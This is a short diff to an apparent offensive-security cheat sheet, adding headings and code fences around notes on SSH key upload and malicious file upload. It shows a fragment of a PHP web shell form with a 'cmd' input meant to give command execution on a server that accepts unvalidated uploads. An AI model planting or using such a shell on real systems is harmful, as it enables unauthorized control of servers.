@@ -735,7 +735,7 @@ From Website
 To get Cookies
 
 
-SSH KEYUPLOAD 
+## SSH KEYUPLOAD 
 
 ssh-keygen -t rsa -b 4096
 cat ~/.ssh/id_rsa.pub
@@ -751,6 +751,9 @@ SSH INTO MACHINE
 
 ## MALICIOUS FILE UPLOAD
 
+UPLOAD
+
+
 Server doesn’t validate extension or size
 
 Allows for code execution (shell)
@@ -761,7 +764,7 @@ Find your file
 
 Call your file
 
-
+```
   <HTML><BODY>
   <FORM METHOD="GET" NAME="myform" ACTION="">
   <INPUT TYPE="text" NAME="cmd">
@@ -775,7 +778,7 @@ Call your file
   ?>
   </pre>
   </BODY></HTML>
-
+```
 
 
 ## SERVER SIDE INJECTION (CMD)
